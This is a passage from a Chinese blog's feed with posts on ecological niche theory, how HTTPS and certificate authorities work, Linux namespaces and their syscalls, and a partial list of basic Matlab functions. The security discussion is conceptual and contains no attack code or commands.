<li>生态位分化的重要性</li></ul><p>生态位虽然定义多样，但单单就其字面意思理解，即为：生物在环境中所占据的位置。每个生物因为位置不同，所养成的生活习性，等等都有所不同。于是研究生态位十分有必要。生态位分化对物种共存和群落构建有着重要的作用,同时前人研究结果表明了整合生态位理论和中性理论来解释群落物种多样性分布格局的必要性。如果物种间存在竞争能力差异而且没有生态位分化,那么系统将会很快发生竞争排除并到达平衡状态,即竞争能力最强的物种将排除掉其他物种,并且系统的平衡点是全局稳定的,即不论物种的初始多度是多少(除了0之外),系统最终将达到平衡状态。更新限制和扩散限制能够在一定程度上延缓竞争排除,但是跟Hurtt和Pacala(1995)的研究结果相比,其作用范围相当有限。实际上,即使种间微弱的竞争能力差异,也需要极端的更新限制和扩散限制才能延缓竞争排除。</p><ul>  <li>生态位分化在森林中的应用</li></ul><p>在森林功能发育过程中,生态位分化表现为稳定下降,而物种扩散则为前期不变,后期稳定下降.群落功能发育尺度上的物种扩散伴随了冠层稳定的骨架结构及分离的垂直结构,提高了垂直分布上群落物种组成的匀质性,有利于物种共存.局域尺度上,物种扩散与生态位分化过程的交互效应是群落构建的主要动力,物种扩散作用要强于生态位分化过程.本研究暗示除了空间因子等的被动调节,中性与生态位过程对群落构建的相对贡献也受群落功能发育阶段的影响,群落构建驱动力受群落自身功能的调节。</p><ul>  <li>生态位分化对物种多样性维持的重要性</li></ul><p>生态位理论强调确定性过程在群落构建中起决定性作用,而中性理论则强调随机性过程的重要性。实际上,二者关于确定性和随机性在群落构建中的相对重要性的争论已经持续了一个多世纪。许多研究表明,生态位理论和中性理论都有不少支持和否定的证据。因此,生态学家们尝试整合生态位理论和中性理论来解释群落物种多样性分布格局。</p><ul>  <li>群落生态学中生态位理论的重要性</li></ul><p>在群落生态学中有关生态位(niche)概念描述“生态位就是指动物在群落中的地位,食物和天敌的关系”,所谓地位是指动物在空间或时间上所占的特殊位置,它与食物和天敌的关系是指动物在群落中的作用。</p><ul>  <li>空间生态位宽度值的大小的意义</li></ul><p>空间生态位宽度值的大小反映的是物种在空间维度上分布范围的大小。宽度值越大，意味着生物能在较大的空间范围内生存，进而如果环境变化，对其产生的影响就小。一个物种的时空生态位宽度值一定时 , 其时间生态位宽度值最大 , 并非空间生态位的宽度值也是最大 。</p><ul>  <li>生态位重叠的意义</li></ul><p>时间生态位重叠反映的是不同物种对资源利用在时间维度上的相似程度。空间生态位重叠反映的是不同物种对资源利用在空间维度上的相似程度 。时间和空间生态位重叠反映的是时间和空间单因素情况下物种间的生态位重叠 , 时空二维生态位重叠计算采用时间生态位重叠与空间生态位重叠的乘积效果较好。时空二维生态位宽度值较大的种类与相对重要性指数较大的种类有着明显的差异 。</p><ul>  <li>生态位重叠与竞争的关系</li></ul><p>种群间的生态位重叠与竞争的关系一直为生态学家们所关注。最典型的是生态位重叠被借用作为著名的 Lotke-volterva竞争方程的竞争系数 。但是实际上生态位重叠值绝不能与竞争程度等同。这是由于目前种间生态位重叠值基本上只是某个或几个生态因子梯度上的度量值 , 而影响物种的生长发育的生态因子众多 , 很难对所有因子进行生态位重叠的计测。例如 , 种 A和种 B在 X维度上完全重叠 , 但是在 Y维度上可能分割而避免了竞争 。 彭少麟等在研究鼎湖山森林群落优势种群生态位重叠时也指出 , 椎栗、 木荷等种群作为上层木  , 柏拉木作为第 4层的灌木 , 两者在水平空间维度上可以是重叠的 , 但在垂直空间维度上的分割 , 使其对光能的利用具有互补作用而无竞争意义。甚至由于中生性小乔木需要一定的荫蔽度 , 则它与大乔木在水平空间维度上的生态位重叠不仅不是竞争 , 反而是一种惠利。 然而 , 如果在 n维空间上均重叠的种对 , 必定或多或少有竞争 , 其生态位重叠值可以基本与竞争程度等同。 因此 , 在应用生态位重叠作为竞争系数时必须谨慎考虑。</p><ul>  <li>生态位理论在森林资源评价中的应用</li></ul><p>对森林资源的分析与评价在现有林经营管理中占据着重要地位。无论是对区域森林资源总体的宏观决策, 还是对具体林分的经营对策, 都是以通过森林资源分析所提供的信息为基础。利用空间生态位理论对森林资源进行分析评价, 把森林资源作为一个生态系统, 将组成森林资源的各树种( 组) 在生态系统中的空间位置、分布方式、分布范围和数量, 以及增长或消减趋势有序地表达出来, 并与森林生态系统的演替、进化与衰退状况耦和在一起, 从而反映出森林群落的演替动态及趋势, 达到对森林资源进行有效地评价的目的。 任青山等采用空间生态位理论的分析方法,  对黑龙江省东部典型天然次生林和接近原始阔叶红松林两个区域的森林类型的主要种群的空间生态位宽度和地理矩进行了定量测定, 并对森林资源进行了空间生态位的划分, 从而反映出森林群落的演替动态及趋势。</p><ul>  <li>生态位理论在城市生态学中的应用</li></ul><p>经过 80多年的发展, 生态位的概念及其理论正日趋完善, 已超越了生物学的范畴, 渗透到了许多领域。 其中, 把生态位理论应用于城市的研究是值得深入探讨的课题之一。 王如松将生态位理论应用于城市生态系统的研究。 他将城市生态位定义为: 一个城市或任何一种人类栖境给人类活动所提供的生态位是指它所提供给人们的或可被人们所利用的各种生态因子和生态关系的集合。建立在生态位概念基础上的生态位理论、方法应与城市生态系统的有生态位态势理论、生态位适宜度理论、生态势理论、生态位扩充理论、生态位重叠、分离理论。 罗小龙等以南京市为例,  将生态位及态势理论引入城乡结合部研究中, 分析了城乡生态位及其态势对于城乡结合部空间扩展的塑造作用。</p><ul>  <li>虚拟生态位策略</li></ul><p>企业生态资源状况对企业生态位具有决定意义，随着人类社会由工业社会迈向信息社会，企业生态资源概念的外延、内涵及其企业对生态资源的占有方式正在发生深刻的变化。在信息社会，知识将作为占主导地位的资源和生产要素而存在，企业之间的竞争主要不是自然资源和其它有形的资本的竞争，而是拥有知识和技术多少的竞争、知识创新的竞争。信息社会竞争的加剧和环境变化的加快，使得企业无法单纯依靠自己生态资源来满足市场的需要。虚拟生态位和生态资源的共享为企业的发展拓展了生态空间，虚拟生态位的实质是发挥自身优势，对外部资源和力量进行有效整合，拓展自己的生态资源，达到降低成本、提高竞争力的目的。所以，企业要善于利用和建立虚拟生态位，以丰富自己的生态资源，改善生存、竞争环境，从而占据有利的生态位。巨大的全球网络、信息的光速流动使得企业生态资源的共享简单而便捷。</p><ul>  <li>对生态位研究，发展的一点建议</li></ul><p>在如今这样一个变化极其迅速的社会，生态位已不仅仅是一个普通的生态学概念，他在生活的方方面面都发挥着不可或缺的作用。所以说，接下来的生态位理论研究应该多注重对学科交叉方面的研究，特别是与人有关的方面研究。</p><ul>  <li>    <p>生态位理论发展展望</p>    <ul>      <li>        <p>生态位理论的原理和方法可以贯穿和应用于生态学基础理论各个分支之中。当生态位理论同生物多样性保护、退化生态系统恢复与重建、生态系统可持续发展中的理论及其实践工作结合到一起时, 生态位理论或许会对生态学发展、对人类文明进步发挥出令人振奋的作用。</p>      </li>      <li>        <p>目前, 关于生态位理论仍存在许多令人迷惑的问题, 如生态位概念虽然已从生境生态位、功能生态位、超体积生态位发展到时间生态位, 但其表述庞杂含糊、莫衷一是, 需要经过充分讨论研究和必要的国际学术会议评价议定, 生态位的基础概念一旦明确统一, 生态位理论便会很快进一步丰富和成熟起来。</p>      </li>      <li>        <p>随着科学技术的不断进步及相关领域的发展, 将会拓宽生态位理论的研究范围, 再重新评价和发展以传统生态位理论为基础的其他理论。</p>      </li>    </ul>  </li></ul><p><br><br>本文链接： <a href="http://home.meng.uno/articles/85c6ef64/">http://home.meng.uno/articles/85c6ef64/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      生态位已是国内外生态学领域广泛使用的术语和研究热点 。自进入 20 世纪 90 年代以来, 生态位 ( niche) 这一概念在生态学界受到了前所未有的关注, 这是继 20 世纪 70 年代生态位理论研究热之后的第 2 个发展高潮。由于物种多样性、物种竞争、群落结构和功能及演替与种群进化、群落物种积聚原理都以生态位理论为基础, 因此生态位理论逐渐成为生态学中重要的基础理论之一, 受到了国内外学者的广泛重视。然而, 令人遗憾的是迄今为止在生态位研究领域尚未形成一套系统完整的为各国学者所共同接受的理论框架, 许多学者也对生态位的概念长期争论不休, 所以对生态位的定义也是多样化的。现将生态位理论及其
    
    </summary>
    
      <category term="Bioinformatics" scheme="http://home.meng.uno/categories/Bioinformatics/"/>
    
    
      <category term="生态位" scheme="http://home.meng.uno/tags/%E7%94%9F%E6%80%81%E4%BD%8D/"/>
    
  </entry>
  
  <entry>
    <title>再探HTTPS</title>
    <link href="http://home.meng.uno/articles/87267df0/"/>
    <id>http://home.meng.uno/articles/87267df0/</id>
    <published>2016-06-16T09:31:04.000Z</published>
    <updated>2020-12-02T01:48:19.000Z</updated>
    
    <content type="html"><![CDATA[<h1>再探HTTPS</h1><p>之前有一篇笔记是浅谈HTTPS的，但是比较简单的记录了下，也是懵懵懂懂的，索性把文献都翻出来，查阅一番，较为深入的理解下。</p><h2 id="http在安全方面的不足">HTTP在安全方面的不足</h2><ul>  <li>通信使用明文（不加密），内容可能会被窃听</li>  <li>不验证通信方的身份，因此有可能遭遇伪装</li>  <li>无法证明报文的完整性，所以有可能已遭篡改</li></ul><p>这些问题不仅在 HTTP 上出现，其他未加密的协议中也会存在这类问题</p><h3 id="窃听">窃听</h3><p><img src="http://www.meng.uno/images/https/qieting.jpg" alt=""></p><p>由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文使用明文（指未经过加密的报文）方式发送。</p><h3 id="伪装">伪装</h3><p><img src="http://www.meng.uno/images/https/weizhuang.jpg" alt=""></p><p>HTTP 协议中的请求和响应不会对通信方进行确认。也就是说存在“服务器是否就是发送请求中 URI 真正指定的主机，返回的响应是否真的返回到实际提出请求的客户端”等类似问题。</p><h3 id="篡改">篡改</h3><p><img src="http://www.meng.uno/images/https/chuangai.jpg" alt=""></p><p>由于 HTTP 协议无法证明通信的报文完整性，因此，在请求或响应送出之后直到对方接收之前的这段时间内，即使请求或响应的内容遭到篡改，也没有办法获悉。响应在传输途中，遭攻击者拦截并篡改内容的攻击称为中间人攻击（Man-in-the-Middle attack，MITM）</p><h2 id="http-加密-认证-完整性保护-https">HTTP+ 加密 + 认证 + 完整性保护 =HTTPS</h2><p><img src="http://www.meng.uno/images/https/https.jpg" alt=""></p><p>通常，HTTP 直接和 TCP 通信。当使用 SSL 时，则演变成先和 SSL 通信，再由 SSL 和 TCP 通信了。简言之，所谓 HTTPS，其实就是身披 SSL 协议这层外壳的 HTTP。</p><p>SSL 是独立于 HTTP 的协议，所以不光是 HTTP 协议，其他运行在应用层的 SMTP 和 Telnet 等协议均可配合 SSL 协议使用。可以说 SSL 是当今世界上应用最为广泛的网络安全技术。</p><p><img src="http://www.meng.uno/images/https/ssl.jpg" alt=""></p><h3 id="共享密钥-对称密钥-公开密钥-非对称密钥">共享密钥（对称密钥） &amp; 公开密钥（非对称密钥）</h3><p>了解HTTPS必须要了解到一些常用的加密手段，以及其优势和劣势，因为HTTPS 采用共享密钥加密和公开密钥加密两者并用的混合加密机制。</p><h4 id="共享密钥">共享密钥</h4><p>加密和解密都会用到密钥。没有密钥就无法对密码解密，反过来说，任何人只要持有密钥就能解密了。如果密钥被攻击者获得，那加密也就失去了意义。但是与公开密钥相比，其加密、揭秘性能高。</p><p><img src="http://www.meng.uno/images/https/duicheng.jpg" alt=""></p><h4 id="公开密钥">公开密钥</h4><p>公开密钥加密使用一对非对称的密钥。一把叫做私有密钥（private key），另一把叫做公开密钥（public key）。顾名思义，私有密钥不能让其他任何人知道，而公开密钥则可以随意发布，任何人都可以获得。</p><p>使用公开密钥加密方式，发送密文的一方使用对方的公开密钥进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密。利用这种方式，不需要发送用来解密的私有密钥，也不必担心密钥被攻击者窃听而盗走。</p><p><img src="http://www.meng.uno/images/https/gongkai.jpg" alt=""></p><h3 id="https-采用混合加密机制">HTTPS 采用混合加密机制</h3><p><img src="http://www.meng.uno/images/https/hunhe.jpg" alt=""></p><p>看得出，服务器在提供给客户端public key时如果被第三发截获、掉包那么就有安全问题了，所有又有了第三发验证机构：数字证书认证机构（CA，Certificate Authority）</p><p>首先，服务器的运营人员向数字证书认证机构提出公开密钥的申请。数字证书认证机构在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书后绑定在一起。</p><p>服务器会将这份由数字证书认证机构颁发的公钥证书发送给客户端，以进行公开密钥加密方式通信。公钥证书也可叫做数字证书或直接称为证书。</p><p><img src="http://www.meng.uno/images/https/ca.jpg" alt=""></p><h3 id="https-的安全通信机制">HTTPS 的安全通信机制</h3><p>一切都准备好了，下一步就是利用上面的知识点做一个可靠、安全的通行链路了，具体细节可以从这个流程图例获得</p><p><img src="http://www.meng.uno/images/https/httpslianlu.jpg" alt=""></p><p>请注意第2步时，当服务器给客户端返回自己的证书时，证书包含三部分内容，公钥、名称、数字签名等信息；注意数字签名是加密的，数字签名是用颁发机构的私钥对本证书的公钥，名称以及其他信息做hash散列加密而成的，所以客户端需要解密数字签名来验证该证书是否是合法可靠的，那怎么解密呢，客户端浏览器会找到该证书的根证书颁发机构，然后在本机上的证书管理器里寻找 那些受信任的根证书颁发机构列表是否有该证书的根证书颁发机构，如果有，则用该根证书的公钥解密服务器下发的证书</p><ul>  <li>如果不能正常解密，则服务器下发的证书则被认为是伪造的，浏览器弹出提示框</li>  <li>如果能正常解密，则获取到公钥，名称，数字签名信息跟本身的公钥等其他信息比对一下，确认公钥没有被篡改，如果公钥不一致，则依然被认为是不可信的</li></ul><p>因此客户端验证服务器的合法性取决于公钥，而公钥的合法性取决于ca证书颁发机构的合法性，这里会形成一个信任链，而终点则是CA根证书，根证书是CA机构自己办法给自己的，根证书是一个特殊的数字证书，公钥是公开的，而私钥是被CA机构保存在硬件中的，所以证书的安全性取决于你对该CA机构的信任，反过来说，加入CA机构的密钥被窃取，那么该CA机构颁发的所有证书将会存在灾难性安全问题；</p><p>就像你验证身份证是否真实，肯定去公安局验证，那么谁来保证公安局是合法可靠的呢，没人能保证，公安局自己生命自己是合法可靠的，就这么简单</p><h2 id="ssl-tls">SSL/TLS</h2><p>HTTPS 使用 SSL（Secure Socket Layer） 和 TLS（Transport Layer Security）这两个协议。</p><p>SSL 技术最初是由浏览器开发商网景通信公司率先倡导的，开发过 SSL3.0 之前的版本。目前主导权已转移到 IETF（Internet Engineering Task Force，Internet 工程任务组）的手中。</p><p>IETF 以 SSL3.0 为基准，后又制定了 TLS1.0、TLS1.1 和 “TLS1.2。TSL 是以 SSL 为原型开发的协议，有时会统一称该协议为 SSL。当前主流的版本是 SSL3.0 和 TLS1.0。</p><p>由于 SSL1.0 协议在设计之初被发现出了问题，就没有实际投入使用。SSL2.0 也被发现存在问题，所以很多浏览器直接废除了该协议版本。</p><h2 id="https-or-not">HTTPS or Not</h2><p>虽然HTTPS在安全上做到了保障，但是一份付出一分收获。</p><p><img src="http://www.meng.uno/images/https/httpsxingneng.jpg" alt=""></p><h3 id="速度">速度</h3><p>SSL 的慢分两种。一种是指通信慢。另一种是指由于大量消耗 CPU 及内存等资源，导致处理速度变慢。</p><p>和使用 HTTP 相比，网络负载可能会变慢 2 到 100 倍。除去和 TCP 连接、发送 HTTP 请求 • 响应以外，还必须进行 SSL 通信，因此整体上处理通信量不可避免会增加。</p><h3 id="价格">价格</h3><p>要进行 HTTPS 通信，证书是必不可少的。而使用的证书必须向认证机构（CA）购买。证书价格可能会根据不同的认证机构略有不同。通常，一年的授权需要600人民币。</p><h2 id="https真的可靠吗？">HTTPS真的可靠吗？</h2><blockquote>  <p>没有绝对的安全</p></blockquote><ul>  <li>一个合法有效的SSL证书误签发给了假冒者</li>  <li>破解SSL证书签发CA的私钥</li>  <li>SSL证书签发CA的私钥泄露</li>  <li>破解SSL证书的私钥</li>  <li>SSL证书的私钥泄露</li>  <li>伪造一个合法有效的SSL证书</li>  <li>认证机构主动为假冒网站签发合法有效的服务器证书</li>  <li>利用可信的SSL服务器证书进行中间人攻击</li>  <li>在用户主机中植入伪造的根CA证书（或一个完整的CA证书链）</li>  <li>旁路证书可信性的验证</li></ul><p><br><br>本文链接： <a href="http://home.meng.uno/articles/87267df0/">http://home.meng.uno/articles/87267df0/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      再探HTTPS
之前有一篇笔记是浅谈HTTPS的，但是比较简单的记录了下，也是懵懵懂懂的，索性把文献都翻出来，查阅一番，较为深入的理解下。

HTTP在安全方面的不足
 * 通信使用明文（不加密），内容可能会被窃听
 * 不验证通信方的身份，因此有可能遭遇伪装
 * 无法证明报文的完整性，所以有可能已遭篡改

这些问题不仅在 HTTP 上出现，其他未加密的协议中也会存在这类问题

窃听


由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文使用明文（指未经过加密的报文）方式发送。

伪装


HTTP 协议中
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="web" scheme="http://home.meng.uno/tags/web/"/>
    
      <category term="https" scheme="http://home.meng.uno/tags/https/"/>
    
      <category term="ssl" scheme="http://home.meng.uno/tags/ssl/"/>
    
  </entry>
  
  <entry>
    <title>Linux中的Namespace</title>
    <link href="http://home.meng.uno/articles/e81ea9b1/"/>
    <id>http://home.meng.uno/articles/e81ea9b1/</id>
    <published>2016-06-10T03:44:56.000Z</published>
    <updated>2020-12-02T01:43:32.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>当前，linux实现了6种不同类型的namespaces。每种namespace，都用来<strong>包含一类特定的系统资源</strong>，这样从命名空间内部的进程来看，它们就拥有了隔离的全局资源。namespaces的一个目标就是<strong>容器</strong>，一种轻量级的虚拟化工具，让一组进程认为它们是系统上仅有的一组进程。</p></blockquote><h1>Mount namespaces</h1><p>mount namespace(CLONE_NEWNS)隔离一组进程所能看到文件系统mount点。在不同mount namespaces中的进程，对于文件系统有不同的视图。在使用了mount namespaces之后，mount和umount系统调用不再对所有进程可见的，全局的mount points进行操作，而是只会影响和发起调用的进程相关的mount namespace。<br> 利用主从关系，还可以让一个mount namespace自动拥有另一个mount namespace的内容，例如一个硬盘设备挂在到某个namespace中后会自动显示在另一个namespace中。<br>  mount namespace是linux上实现的第一种namespace。</p><h1>UTS namespaces</h1><p>UTS namespace(CLONE_NEWUTS)隔离两种系统标识符：nodename和domainname。在容器的上下文环境中，UTS namespaces特性允许每个容器拥有自身的hostname和NIS domain name。这允许了根据容器的name来定义它们的行为，uts指的是UNIX Time-sharing System，它是传递给uname系统调用的参数。</p><h1>IPC namespaces</h1><p>IPC namespaces(CLONE_NEWIPC)隔离inter-process communication resources，也即跨进程的通讯资源，System V IPC，以及POSIX message queues。这些IPC机制的共性时，IPC objects是由特殊机制来进行识别的，而不是文件系统的路径。在每个namespaces当中，又有其自身所拥有的System V IPC标识符和POSIX message queue filesystem。</p><h1>PID namespaces</h1><p>PID namespaces(CLONE_NEWPID)隔离进程ID空间，也就是说，不同PID命名空间的进程，可以拥有相同的PID。这样做的一个好处是，容器能够在不同的hosts之间转移，但是又能够保持其中的进程ID不变。而且PID namespace能够允许每个容器拥有自己的init(pid 1)，对初始化、孤儿进程等事件进行处理。</p><p>从一个PID namespace的角度来看，一个进程拥有两个PID：namespace内部的PID，以及namespace外部的，host上的PID。PID namespaces也是可以层叠的，从进程所归属的PID命名空间开始，一直到根PID namespace，它都有一个PID；一个进程只能看到处于它所在PID namespace当中的，以及更下层的其他进程。</p><h2 id="userspace-api">Userspace API</h2><p>为了创建一个新的namespace，进程需要调用clone系统调用，并且使用CLONE_NEWPID标识位。<br> 在一个新的namespace当中，第一个task的PID是1，它也就是这个namespace的init，以及child_reaper。但这个init是可以死亡的，此时这个namespace都会终止。  <br> 在把tasks分割出来之后，还必须对proc进行处理，让它只显示当前task可见的PID。为了实现这个目的，procfs应该在每个namespace被使用一次。</p><h2 id="internal-api">Internal API</h2><p>一个task所拥有的所有PID都在struct pid中被描述了。这个数据结构如下：</p><pre><code>struct upid {int nr;/* moved from struct pid */struct pid_namespace *ns;/* the namespace this value * is visible in */struct hlist_node pid_chain;/* moved from struct pid */};struct pid {atomic_t count;struct hlist_head tasks[PIDTYPE_MAX];struct rcu_head rcu;int level;/* the number of upids */struct upid numbers[0];};</code></pre><p>这里，struct upid表示PID值，它储存在hash当中，并且拥有PID值。为了转换得到这个pid值，可以使用task_pid_nr,pid_nr_ns(),find_task_by_vpid等函数。<br> 这些函数的后缀有一些规律：  <br> __nr()：对“全局”的PID进行操作，这里全局指的是在整个系统中也是独一无二的。pid_nr会告诉你struct pid的global PID，这只在PID值不会离开kernel时使用。<br> __vnr()：对“virtual”PID进行操作，也就是进程可见的ID，例如task_pid_vnr会告诉你一个task的PID。  <br> _nr_ns()：对指定namespace中的PID进行处理，如果希望得到某个task的PID，可以通过task_pid_nr_ns来获得pid number，在用find_task_by_pid_ns来找到这个task。这个方法在系统调用中很常见，特别是当PID来自用户空间时。在这种情况下，task可能是在另一个namespace中的。</p><h1>network namespaces</h1><p>network namespaces(CLONE_NEWNET)将系统中与网络相关的资源隔离。也就是说，每个namespace当中拥有自身的网络设备、IP地址、IP路由表，端口号等。</p><p>network namespaces让containers能够被应用到网络的层面上。每个container能够拥有自身的网络设备、并且其应用能够被绑定到namespace中特有的端口号上，对于特定的container，还可以设置特殊的路由规则。例如，可以在同一个host系统上，运行多个用container包含的servers，并且它们都绑定了80端口。</p><h1>User namespaces</h1><p>user namespaces(CLONE_NEWUSER)将用户和group ID空间隔离。这也就是说，在一个user namespace内外，同一个进程点user和group id可以是不同的。例如，一个进程可以在一个user namespace外部，拥有一个普通的、无特权的user ID；而在在namespace中拥有UID 0。也就是说在namespace当中拥有root权限，但在namespace外部则不行。</p><p>从Linux 3.8开始，无特权的进程能够创建它们自身的user namespaces，这为应用提供了新的可能：由于一个进程能够在其user namespaces中拥有root权限，那么它们就能够去使用那些本身只能由root用户使用的功能。但这确实会带来一些安全问题。</p><h1>C++中的namespace</h1><p>编程语言中的namespace，虽然拥有相同的名称，其含义是完全不同的。但主要的思想是一致的，这里的命名空间也就是将空间内定义的内容放在一个盒子里，而命名空间也就是这个区域，using namespace 空间名，就将区域引入到了操作范围之内。<br> 这里，namespace是一种描述逻辑分组的机制，比如可以将某些属于同一个任务的类声明在同一个命名空间当中。标准C++库当中的所有内容，都被定义在命名空间std当中了。</p><h1>Namespace API</h1><p>namespace的API包含3个系统调用——clone，unshare，setns，以及一系列的/proc文件。为了指定操作的namespace类型，这3个系统调用都使用了一个CLONE_NEW常量(CLONE_NEWIPC,CLONE_NEWNS,etc)。</p><h2 id="clone">Clone</h2><p>通过clone，可以创建一个namespace，它是一个创建新的process的系统调用。其函数原型为：</p><pre><code>int clone(int (*child_func)(void *), void *child_stack, int flags, void *arg);</code></pre><p>clone可以看作fork()的通用版本，其功能能够通过flags参数CLONE_*来控制，这些参数包含了parent和child是否共享虚拟内存、打开文件描述符等。而如果参数中CLONE_NEW位被指定了，那么就会创建一个新的，对应类型的namespace，而新的进程则成为这个namespace中的一个成员。</p><p>和大多数其他的namespaces一样，创建一个UTS namespace是需要特权的，例如CAP_SYS_ADMIN，这对于避免需要设置user ID的应用来说是有必要的：如果能够使用任意的hostname，那么一个非特权用户就能够破坏lock file的作用，或者能够改变应用的行为。</p><h2 id="proc-里的文件">/proc/里的文件</h2><p>对于每一个进程来说，都有一个/proc/PID/ns目录，这其中每一种类型的namespace，都对应了一个文件。从linux 3.9开始，这些文件都被符号链接，作为处理这个进程相关namespace的handler。</p><pre><code>$ ls -l /proc/$$/ns         # $$ is replaced by shell's PIDtotal 0lrwxrwxrwx. 1 mtk mtk 0 Jan  8 04:12 ipc -&gt; ipc:[4026531839]lrwxrwxrwx. 1 mtk mtk 0 Jan  8 04:12 mnt -&gt; mnt:[4026531840]lrwxrwxrwx. 1 mtk mtk 0 Jan  8 04:12 net -&gt; net:[4026531956]lrwxrwxrwx. 1 mtk mtk 0 Jan  8 04:12 pid -&gt; pid:[4026531836]lrwxrwxrwx. 1 mtk mtk 0 Jan  8 04:12 user -&gt; user:[4026531837]lrwxrwxrwx. 1 mtk mtk 0 Jan  8 04:12 uts -&gt; uts:[4026531838]</code></pre><p>这些符号链接的作用之一，就是用来检查两个进程是否处于同一个命名空间当中。kernel保证如果两个进程在同一个namespace当中，那么/proc/PID/ns中的inode number就会是一致的。inode numbers能够通过stat()系统调用来得到。</p><p>但是，kernel还是会构造/proc/PID/ns的符号链接，并使得它指向字符串，这个字符串包含了namespace的类型和inode number。 如果这个符号链接被打开，那么即使namespace中的进程全部终止了，namespace也不会消被清除。</p><h2 id="setns">setns</h2><p>setns可以被用来加入一个已存在的namespace。保持一个没有任何进程的namespace，是因为随时可以加入新的进程到这个namespace当中去，这也是setns系统调用的作用。其函数原型为：</p><pre><code>int setns(int fd, int nstype);</code></pre><p>更准确的说，setns解除一个进程和之前对应nstype的namespace的联系，并且将其关联到新的，对应类型的namespace中去。这里，fd指定了对应的namespace，它是/proc/PID/ns目录下的一个文件描述符。而nstype则会用来检查fd指向的namespace的类型。<br> 利用setns和execve，能够构造一个很有效的工具：一个加入指定namespace然后再namespace中执行一条命令的程序。  <br> 从linux 3.8开始，setns能够加入任何类型的namespace。</p><h2 id="unshare">unshare</h2><p>unshare用来离开namespace。<br> unshare的功能类似于clone，它创建一个新的namespaces，并且让调用者称为这个命名空间的一部分。它的主要目的，是在不创建新的进程或线程的前提下，完成namespace的分离工作。</p><pre><code>clone()和if(fork() == 0)unshare()是等价的</code></pre><p><br><br>本文链接： <a href="http://home.meng.uno/articles/e81ea9b1/">http://home.meng.uno/articles/e81ea9b1/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      当前，linux实现了6种不同类型的namespaces。每种namespace，都用来包含一类特定的系统资源，这样从命名空间内部的进程来看，它们就拥有了隔离的全局资源。namespaces的一个目标就是容器，一种轻量级的虚拟化工具，让一组进程认为它们是系统上仅有的一组进程。

Mount namespaces
mount namespace(CLONE_NEWNS)隔离一组进程所能看到文件系统mount点。在不同mount namespaces中的进程，对于文件系统有不同的视图。在使用了mount namespaces之后，mount和umount系统调用不再对所有进程可见的，全局的moun
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="Linux" scheme="http://home.meng.uno/tags/Linux/"/>
    
      <category term="Namespace" scheme="http://home.meng.uno/tags/Namespace/"/>
    
  </entry>
  
  <entry>
    <title>Matlab基本函数</title>
    <link href="http://home.meng.uno/articles/dbf56532/"/>
    <id>http://home.meng.uno/articles/dbf56532/</id>
    <published>2016-06-07T11:02:10.000Z</published>
    <updated>2020-12-02T01:55:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1>求矩阵行数/列数/维数的函数</h1><p>ndims(A) 返回A的维数</p><p>size(A) 返回A各个维的最大元素个数</p><p>length(A) 返回max(size(A))</p><p>[m,n]=size(A) 如果A是二维数组，返回行数和列数</p><p>nnz(A) 返回A中非0元素的个数</p><h1>取整函数</h1><p>fix(x) 截尾取整</p><p>floor(x) 不超过x 的最大整数(高斯取整)</p><p>ceil(x) 大于x 的最小整数</p><h1>生成随机数函数</h1><p>rand(n):生成0到1之间的n阶随机数方阵</p><p>rand(m,n):生成0到1之间的m×n的随机数矩阵</p><h2 id="其他随机数生成函数">其他随机数生成函数</h2><p>betarnd 贝塔分布的随机数生成器</p><p>binornd 二项分布的随机数生成器</p><p>chi2rnd 卡方分布的随机数生成器</p><p>exprnd 指数分布的随机数生成器</p><p>frndf分布的随机数生成器</p><p>gamrnd 伽玛分布的随机数生成器</p><p>geornd 几何分布的随机数生成器</p><p>hygernd 超几何分布的随机数生成器</p><p>lognrnd 对数正态分布的随机数生成器</p><p>nbinrnd 负二项分布的随机数生成器</p><p>ncfrnd 非中心f分布的随机数生成器</p><p>nctrnd 非中心t分布的随机数生成器</p><p>ncx2rnd 非中心卡方分布的随机数生成器</p><p>normrnd 正态（高斯）分布的随机数生成器</p><p>poissrnd 泊松分布的随机数生成器</p><p>raylrnd 瑞利分布的随机数生成器</p><p>trnd 学生氏t分布的随机数生成器</p><p>unidrnd 离散均匀分布的随机数生成器</p><p>unifrnd 连续均匀分布的随机数生成器</p><p>weibrnd 威布尔分布的随机数生成器</p><h1>基本数学函数</h1><p>abs(x)：纯量的绝对值或向量的长度</p><p>angle(z)：复数z的相角(Phase angle)</p><p>sqrt(x)：开平方</p><p>real(z)：复数z的实部</p><p>imag(z)：复数z的虚部</p><p>conj(z)：复数z的共轭复数</p><p>round(x)：四舍五入至最近整数</p><p>fix(x)：无论正负，舍去小数至最近整数</p><p>floor(x)：地板函数，即舍去正小数至最近整数</p><p>ceil(x)：天花板函数，即加入正小数至最近整数</p><p>rat(x)：将实数x化为分数表示</p><p>rats(x)：将实数x化为多项分数展开</p><p>sign(x)：符号函数</p><ul>  <li>当x&lt;0时，sign(x)=-1</li>  <li>当x=0时，sign(x)=0</li>  